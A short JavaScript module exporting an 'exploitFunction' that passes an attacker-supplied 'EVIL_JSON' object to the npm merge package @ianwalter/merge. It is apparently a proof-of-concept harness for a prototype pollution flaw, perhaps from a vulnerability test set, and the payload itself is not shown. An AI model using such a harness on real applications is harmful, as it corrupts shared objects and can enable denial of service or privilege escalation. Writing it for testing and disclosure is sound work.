function exploitFunction(payload) {
    const { EVIL_JSON } = payload;
    const merge = require("@ianwalter/merge");
    merge({}, EVIL_JSON);
}

module.exports = { exploitFunction };